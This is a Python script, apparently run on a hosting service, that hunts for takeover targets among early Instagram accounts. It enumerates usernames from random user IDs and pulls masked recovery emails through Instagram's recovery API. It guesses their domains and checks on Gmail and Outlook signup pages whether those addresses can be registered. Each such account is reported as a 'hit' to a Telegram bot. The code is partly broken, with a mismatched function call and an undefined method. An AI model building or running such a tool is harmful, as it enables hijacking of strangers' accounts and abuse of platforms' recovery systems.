from hashlib import md5
from time import time
import requests
from uuid import uuid4
import os
from random import choice, randrange
import sys
from threading import Thread
from user_agent import generate_user_agent
import time as time_module
from flask import Flask

# Create Flask app for Render
app = Flask(__name__)

# Disable Flask request logging to reduce noise
import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route('/')
def home():
    return f'''
    <h1>Instagram Checker Running</h1>
    <p>Status: Active</p>
    <p>Hits: {checker.hits if 'checker' in globals() else 0}</p>
    <p>Good Instagram: {checker.good_insgram if 'checker' in globals() else 0}</p>
    <p>Bad Instagram: {checker.bad_instgram if 'checker' in globals() else 0}</p>
    <p>Bad Email: {checker.bad_email if 'checker' in globals() else 0}</p>
    '''

@app.route('/health')
def health():
    return {'status': 'running', 'hits': checker.hits if 'checker' in globals() else 0}

class qredes:
    def __init__(self):
        self.hits = 0
        self.bad_email = 0
        self.bad_instgram = 0
        self.good_insgram = 0
        
        # Get token and ID from environment variables (for Render) or input
        self.token = os.environ.get('TELEGRAM_TOKEN') or input('[+] Enter Token : ')
        if not os.environ.get('TELEGRAM_TOKEN'):
            os.system('clear' if os.name == 'posix' else 'cls')
        
        self.id = os.environ.get('TELEGRAM_CHAT_ID') or input('[+] Enter ID : ')
        if not os.environ.get('TELEGRAM_CHAT_ID'):
            os.system('clear' if os.name == 'posix' else 'cls')
        
        # Instagram user ID ranges for 2010-2012 era
        # Instagram launched in October 2010
        # 2010 (Oct-Dec): 1 - 1,000,000
        # Early 2011: 1,000,000 - 10,000,000
        # Late 2011: 10,000,000 - 50,000,000
        # 2012: 50,000,000 - 150,000,000
        self.MIN_USER_ID = 1
        self.MAX_USER_ID = 150000000  # Covers 2010-2012
        
        print(f"[+] Targeting 2010-2012 era users (ID range: {self.MIN_USER_ID} - {self.MAX_USER_ID})")
        print("[+] Ranges: 2010 (1-1M) | Early 2011 (1M-10M) | Late 2011 (10M-50M) | 2012 (50M-150M)")
        
        # Initialize Hotmail tokens
        while True:
            try:
                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-US,en;q=0.9',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
                }
                response = requests.get('https://signup.live.com/signup', headers=headers, timeout=10)
                canary = str.encode(response.text.split('"apiCanary":"')[1].split('"')[0]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
                self.amsc = response.cookies.get_dict()['amsc']
                
                cookies = {'amsc': self.amsc}
                headers = {
                    'accept': 'application/json',
                    'accept-language': 'en-US,en;q=0.9',
                    'canary': canary,
                    'content-type': 'application/json; charset=utf-8',
                    'origin': 'https://signup.live.com',
                    'referer': 'https://signup.live.com/',
                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
                }
                json_data = {
                    'clientExperiments': [{
                        'parallax': 'enableplaintextforsignupexperiment',
                        'control': 'enableplaintextforsignupexperiment_control',
                        'treatments': ['enableplaintextforsignupexperiment_treatment'],
                    }],
                }
                response = requests.post(
                    'https://signup.live.com/API/EvaluateExperimentAssignments',
                    cookies=cookies,
                    headers=headers,
                    json=json_data,
                    timeout=10
                ).json()
                self.canary = response['apiCanary']
                print("[+] Hotmail tokens initialized successfully")
                break
            except Exception as e:
                print(f'[!] Error getting hotmail tokens: {e}, retrying...')
                time_module.sleep(2)
        
        os.system('clear' if os.name == 'posix' else 'cls')
        
        # Send startup message to Telegram
        self.send_startup_message()
        
        # Use fewer threads for Render (they have limited resources)
        num_threads = int(os.environ.get('NUM_THREADS', '50'))
        print(f"[+] Starting {num_threads} threads...")
        
        for _ in range(num_threads):
            Thread(target=self.home, daemon=True).start()
        
        print("[+] All threads started successfully!")
        print("[+] Bot is running... Check Telegram for hits!")
        print("[+] Logs will show all activity below:")
        print("="*60)
        print("[+] Press Ctrl+C to stop")

    def send_startup_message(self):
        """Send startup message to Telegram"""
        startup_msg = f'''🚀 Instagram Checker Started! 🚀
═══════════════════════════
✅ Status: Running
🎯 Target: 2010-2012 Era Users
📊 ID Range: {self.MIN_USER_ID:,} - {self.MAX_USER_ID:,}
🧵 Threads: {os.environ.get('NUM_THREADS', '50')}
⏰ Time: {time_module.strftime('%Y-%m-%d %H:%M:%S')}
═══════════════════════════
Searching for OG accounts...
by: @m0hsvn'''
        
        print("[+] Sending startup message to Telegram...")
        print(f"[+] Token: {self.token[:20]}...")
        print(f"[+] Chat ID: {self.id}")
        
        while True:
            try:
                response = requests.post(
                    f'https://api.telegram.org/bot{self.token}/sendMessage',
                    data={'chat_id': self.id, 'text': startup_msg},
                    timeout=15
                )
                print(f"[+] Telegram API Response Status: {response.status_code}")
                print(f"[+] Telegram API Response: {response.text}")
                
                if response.status_code == 200:
                    print("✅ Startup message sent successfully!")
                    return True
                else:
                    print(f"❌ Telegram API returned status {response.status_code}")
                    print(f"❌ Response: {response.text}")
                    time_module.sleep(5)
            except Exception as e:
                print(f"❌ Exception sending startup message: {str(e)}")
                time_module.sleep(5)

    def run_forever(self):
        """Keep the script running"""
        try:
            while True:
                time_module.sleep(60)
        except KeyboardInterrupt:
            print("\n[!] Stopping...")
            sys.exit(0)

    def get_recovery_email(self, username):
        """Get recovery email from Instagram"""
        try:
            headers = {
                'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
                'X-Pigeon-Rawclienttime': '1700251574.982',
                'X-IG-Connection-Speed': '-1kbps',
                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
                'X-IG-Bandwidth-TotalBytes-B': '0',
                'X-IG-Bandwidth-TotalTime-MS': '0',
                'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-App-ID': '567067343352427',
                'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
                'Accept-Language': 'en-GB, en-US',
                'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept-Encoding': 'gzip, deflate',
                'Host': 'i.instagram.com',
                'X-FB-HTTP-Engine': 'Liger',
                'Connection': 'keep-alive',
            }
            data = {
                'signed_body': f'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"{username}"}}',
                'ig_sig_key_version': '4',
            }
            response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data, timeout=10)
            recovery_email = response.json()['email']
            return recovery_email
        except Exception as e:
            print(f"[!] get_recovery_email error: {str(e)[:50]}")
            return None

    def guess_domain_from_recovery(self, recovery_email):
        """Guess the actual domain from masked recovery email"""
        if not recovery_email:
            return None
        
        try:
            # Extract domain part (e.g., "g***l.com" or "a**.com" or "h******.com")
            domain_part = recovery_email.split('@')[1].lower()
            
            # Check if domain has asterisks
            if '*' not in domain_part:
                return domain_part  # Already unmasked, return as-is
            
            # Get first letter and length to guess domain
            first_letter = domain_part[0]
            length = len(domain_part)
            
            # Common email domains and their patterns
            # Format: first_letter -> list of (actual_domain, possible_lengths)
            domain_patterns = {
                'g': [('gmail.com', [9, 10])],  # g***l.com, gm**l.com
                'h': [('hotmail.com', [11, 12]), ('hushmail.com', [13])],  # h*****l.com
                'o': [('outlook.com', [11]), ('optonline.net', [14])],  # o*****k.com
                'y': [('yahoo.com', [9, 10]), ('ymail.com', [9])],  # y***o.com, ym**l.com
                'a': [('aol.com', [7, 8]), ('att.net', [7])],  # a*l.com, a**.com
                'i': [('icloud.com', [10, 11])],  # i****d.com
                'l': [('live.com', [8]), ('lycos.com', [9])],  # l**e.com
                'm': [('msn.com', [7]), ('mail.com', [8, 9]), ('me.com', [6])],  # m*n.com, m**l.com
                'p': [('protonmail.com', [14])],
                'z': [('zoho.com', [8])],
                'f': [('fastmail.com', [12])],
                'r': [('rocketmail.com', [14])],
                'c': [('comcast.net', [11])],
                'v': [('verizon.net', [11])],
            }
            
            # Try to match based on first letter and length
            if first_letter in domain_patterns:
                for domain, valid_lengths in domain_patterns[first_letter]:
                    if length in valid_lengths:
                        return domain
            
            # If no match, return the most common for that letter
            common_defaults = {
                'g': 'gmail.com',
                'h': 'hotmail.com',
                'o': 'outlook.com',
                'y': 'yahoo.com',
                'a': 'aol.com',
                'i': 'icloud.com',
                'l': 'live.com',
                'm': 'mail.com'
            }
            
            if first_letter in common_defaults:
                return common_defaults[first_letter]
            
            # Last resort: return None (unknown domain)
            return None
            
        except:
            return None

    def validate_recovery_email(self, username, recovery_email):
        """Validate that recovery email matches username pattern"""
        if not recovery_email or recovery_email == "None":
            return False
        
        try:
            # Extract the masked part (e.g., "m*******1" from "m*******1@aol.com")
            masked_part = recovery_email.split('@')[0]
            
            # Get first and last character from masked email
            first_char = masked_part[0].lower()
            last_char = masked_part[-1].lower()
            
            # Get first and last character from username
            username_first = username[0].lower()
            username_last = username[-1].lower()
            
            # Check if they match
            if first_char == username_first and last_char == username_last:
                return True
            return False
        except:
            return False

    def insta1(self, email):
        try:
            csrftoken = md5(str(time()).encode()).hexdigest()
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.147 Mobile Safari/537.36 InstagramLite 1.0.0.0.145 Android (33/13; 480dpi; 1080x2298; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_IQ_#u-nu-latn; 115357035)',
                'x-csrftoken': csrftoken,
            }
            data = {'username': email}
            response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data, timeout=10).text
            if 'showAccountRecoveryModal' in response:
                return True
            else:
                return False
        except Exception as e:
            print(f"[!] insta1 error: {str(e)[:50]}")
            return False

    def insta2(self, email):
        try:
            url = 'https://b.i.instagram.com/api/v1/accounts/login/'
            headers = {
                'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
                'Accept': '*/*',
                'Cookie': 'missing',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-Connection-Type': 'WIFI',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Host': 'i.instagram.com'
            }
            uid = str(uuid4())
            data = {
                'uuid': uid,
                'password': 'ffffdddddaaa666',
                'username': email,
                'device_id': uid,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_countn': '0'
            }
            re = requests.post(url, headers=headers, data=data, timeout=10).text
            if 'bad_password' in re:
                return True
            else:
                return False
        except Exception as e:
            print(f"[!] insta2 error: {str(e)[:50]}")
            return False

    def check_gmail(self, email):
        while True:
            try:
                if '@' in email:
                    email = email.split('@')[0]
                tim = (str(time()).split('.')[0])
                headers = {
                    'authority': 'accounts.google.com',
                    'accept': '*/*',
                    'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'origin': 'https://accounts.google.com',
                    'referer': 'https://accounts.google.com/',
                    'user-agent': generate_user_agent(),
                    'x-same-domain': '1',
                }
                data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C3948%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&'
                re = requests.post(
                    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                    headers=headers,
                    data=data,
                    timeout=10
                ).text
                if 'signup' in re:
                    return True
                else:
                    return False
            except:
                time_module.sleep(0.5)

    def get_account_creation_date(self, user_id):
        """Get account creation date from user ID"""
        try:
            response = requests.get(f'https://mel7n.pythonanywhere.com/?id={user_id}', timeout=5).json()
            return response.get('date', 'Unknown')
        except:
            return 'Unknown'

    def get_info(self, username, domen):
        try:
            headers = {
                'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
                'X-Pigeon-Rawclienttime': '1700251574.982',
                'X-IG-Connection-Speed': '-1kbps',
                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
                'X-IG-Bandwidth-TotalBytes-B': '0',
                'X-IG-Bandwidth-TotalTime-MS': '0',
                'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-App-ID': '567067343352427',
                'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
                'Accept-Language': 'en-GB, en-US',
                'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept-Encoding': 'gzip, deflate',
                'Host': 'i.instagram.com',
                'X-FB-HTTP-Engine': 'Liger',
                'Connection': 'keep-alive',
            }
            data = {
                'signed_body': f'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"{username}"}}',
                'ig_sig_key_version': '4',
            }
            try:
                response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data, timeout=10)
                rest = response.json()['email']
            except:
                rest = None

            # Validate recovery email matches username FIRST
            if not self.validate_recovery_email(username, rest):
                return False  # Not a valid hit, skip

            # Get profile info
            headers = {
                'accept': '*/*',
                'accept-language': 'en',
                'referer': f'https://www.instagram.com/{username}/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': '0',
                'x-requested-with': 'XMLHttpRequest',
            }
            params = {'username': username}
            try:
                response = requests.get(
                    'https://www.instagram.com/api/v1/users/web_profile_info/',
                    params=params,
                    headers=headers,
                    timeout=10
                ).json()
            except:
                response = None

            # Extract user info
            try:
                id = response['data']['user']['id']
            except:
                id = None
            try:
                followerNum = response['data']['user']['edge_followed_by']['count']
            except:
                followerNum = None
            try:
                followingNum = response['data']['user']['edge_follow']['count']
            except:
                followingNum = None
            try:
                postNum = response['data']['user']['edge_owner_to_timeline_media']['count']
            except:
                postNum = None
            try:
                isPraise = response['data']['user']['is_private']
            except:
                isPraise = None
            try:
                full_name = response['data']['user']['full_name']
            except:
                full_name = None
            try:
                biography = response['data']['user']['biography']
            except:
                biography = None
            
            # Get account creation date
            if id:
                date = self.get_account_creation_date(id)
            else:
                date = 'Unknown'

            # Format the message with new template
            info = f'''═══════════════════════════
🎯 HIT FOUND by Arman! 🎯
═══════════════════════════
📧 Email: {username}@{domen}
👤 Username: {username}
👥 Followers: {followerNum if followerNum else 'None'}
👣 Following: {followingNum if followingNum else 'None'}
📸 Posts: {postNum if postNum else 'None'}
🔒 Private: {isPraise if isPraise else 'None'}
🔗 Link: https://instagram.com/{username}
📅 Created: {date}
🆔 ID: {id if id else 'None'}
📝 Name: {full_name if full_name else 'None'}
💬 Bio: {biography if biography else 'None'}
📩 Recovery: {rest if rest else 'None'}
═══════════════════════════
by: @m0hsvn'''

            print(info)
            
            # Save to file
            try:
                with open('hits.txt', 'a', encoding='utf-8') as f:
                    f.write(info + '\n\n')
            except:
                pass

            # Send to Telegram
            max_retries = 5
            for attempt in range(max_retries):
                try:
                    response = requests.get(
                        f'https://api.telegram.org/bot{self.token}/sendMessage',
                        params={'chat_id': self.id, 'text': info},
                        timeout=10
                    )
                    if response.status_code == 200:
                        return True
                    else:
                        time_module.sleep(2)
                except Exception as e:
                    if attempt == max_retries - 1:
                        print(f"\n[!] Telegram send error: {e}")
                    time_module.sleep(2)
            
            return True

        except Exception as e:
            return False

    def check_hotmail(self, email):
        while True:
            try:
                cookies = {'amsc': self.amsc}
                headers = {
                    'accept': 'application/json',
                    'accept-language': 'en-US,en;q=0.9',
                    'canary': self.canary,
                    'content-type': 'application/json; charset=utf-8',
                    'origin': 'https://signup.live.com',
                    'referer': 'https://signup.live.com/',
                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
                }
                json_data = {'signInName': email}
                response = requests.post('https://signup.live.com/API/CheckAvailableSigninNames', cookies=cookies, headers=headers, json=json_data, timeout=10).text
                if '"isAvailable":true' in response:
                    return True
                else:
                    return False
            except:
                time_module.sleep(0.5)

    def get_username_from_id(self, user_id):
        """Get username from Instagram user ID (2011-2012 range)"""
        max_retries = 3
        for attempt in range(max_retries):
            try:
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.instagram.com',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0',
                    'x-csrftoken': 'QOeFYsOi8enKuW80uC0WezhvEgiydc2Y',
                    'x-fb-friendly-name': 'PolarisProfilePageContentDirectQuery',
                    'x-ig-app-id': '936619743392459',
                }
                data = {
                    'variables': '{"id":"' + str(user_id) + '","render_surface":"PROFILE"}',
                    'doc_id': '7663723823674585',
                }
                response = requests.post('https://www.instagram.com/graphql/query', headers=headers, data=data, timeout=10).json()
                username = response['data']['user']['username']
                return [username] if username else None
            except Exception as e:
                if attempt == max_retries - 1:
                    return None
                time_module.sleep(1)

    def home(self):
        while True:
            try:
                sys.stdout.write(f'\rHits: {self.hits} | Bad Instagram: {self.bad_instgram} | Bad Email: {self.bad_email} | Good Instagram: {self.good_insgram}\r')
                sys.stdout.flush()

                # Get username from 2011-2012 era user ID range
                user_id = randrange(self.MIN_USER_ID, self.MAX_USER_ID)
                usernames = self.get_username_from_id(user_id)
                
                if usernames is None:
                    continue

                for username in usernames:
                    print(f"[+] Found username: {username}")
                    
                    # Update stats display
                    sys.stdout.write(f'[📊] Hits: {self.hits} | Bad IG: {self.bad_instgram} | Bad Email: {self.bad_email} | Good IG: {self.good_insgram}\n')
                    sys.stdout.flush()
                    
                    # STEP 1: Check if Instagram account exists
                    api_choice = choice('122')
                    print(f"[*] Checking if Instagram account exists: {username}")
                    
                    if api_choice == '1':
                        has_instagram = self.insta1(f"{username}@gmail.com")  # Just checking if account exists
                    elif api_choice == '2':
                        has_instagram = self.insta2(f"{username}@gmail.com")
                    else:
                        has_instagram = False
                    
                    if not has_instagram:
                        self.bad_instgram += 1
                        print(f"[✗] No Instagram account for: {username}\n")
                        continue
                    
                    self.good_insgram += 1
                    print(f"[✓] Instagram account EXISTS for: {username}")
                    
                    # STEP 2: Get recovery email from Instagram
                    print(f"[*] Getting recovery email for: {username}")
                    recovery_email = self.get_recovery_email(username)
                    
                    if not recovery_email:
                        print(f"[✗] Could not get recovery email for: {username}\n")
                        # Send to Telegram anyway as "Unknown Recovery"
                        self.send_to_telegram_bad(username, "No recovery email found")
                        continue
                    
                    print(f"[✓] Recovery email found: {recovery_email}")
                    
                    # STEP 3: Validate first and last letter match
                    if not self.validate_recovery_email(username, recovery_email):
                        print(f"[✗] Recovery email doesn't match username pattern!")
                        print(f"    Username: {username} (first: {username[0]}, last: {username[-1]})")
                        print(f"    Recovery: {recovery_email}\n")
                        # Send to Telegram as BAD HIT
                        self.send_to_telegram_bad(username, recovery_email, "First/Last letter mismatch ❌")
                        continue
                    
                    print(f"[✓] Recovery email matches username pattern! ✅")
                    
                    # STEP 4: Guess the actual domain from masked recovery email
                    actual_domain = self.guess_domain_from_recovery(recovery_email)
                    
                    if not actual_domain:
                        print(f"[✗] Could not determine actual domain from: {recovery_email}\n")
                        # Send to Telegram anyway with unknown domain
                        self.send_to_telegram_bad(username, recovery_email, "Unknown domain ❓")
                        continue
                    
                    print(f"[✓] Guessed domain: {actual_domain}")
                    
                    # STEP 5: Check if that email is available
                    full_email = f"{username}@{actual_domain}"
                    print(f"[*] Checking if email is available: {full_email}")
                    
                    is_available = False
                    if actual_domain in ['hotmail.com', 'outlook.com', 'live.com', 'msn.com']:
                        is_available = self.check_hotmail(full_email)
                    elif actual_domain in ['gmail.com']:
                        is_available = self.check_gmail(full_email)
                    else:
                        # For other domains, we can't check availability, but still consider it a potential hit
                        print(f"[!] Cannot check availability for {actual_domain}, assuming available")
                        is_available = True
                    
                    if not is_available:
                        self.bad_email += 1
                        print(f"[✗] Email NOT available: {full_email}\n")
                        # Send to Telegram as email taken
                        self.send_to_telegram_bad(username, recovery_email, "Email already taken ❌")
                        continue
                    
                    print(f"[✓] Email IS available: {full_email}")
                    
                    # STEP 6: This is a HIT! Send to Telegram
                    print(f"[🎯] HIT FOUND! Sending to Telegram...")
                    result = self.get_info(username, actual_domain, recovery_email)
                    
                    if result == True:
                        self.hits += 1
                        print(f"[🎯] SUCCESS! Total hits: {self.hits}\n")
                    
            except Exception as e:
                print(f"[!] Error in home loop: {str(e)}")
                time_module.sleep(0.5)

if __name__ == '__main__':
    # Start checker in background thread
    checker = qredes()
    
    # Start Flask web server in a separate thread for Render
    port = int(os.environ.get('PORT', 10000))
    print(f"[+] Starting web server on port {port}...")
    
    # Run Flask in a separate thread so it doesn't block
    flask_thread = Thread(target=lambda: app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False), daemon=True)
    flask_thread.start()
    
    print("[+] Web server started in background")
    print("[+] Main checker is now running - logs will appear below:")
    print("="*60)
    
    # Keep main thread alive and let checker threads output
    try:
        while True:
            time_module.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopping...")
        sys.exit(0)
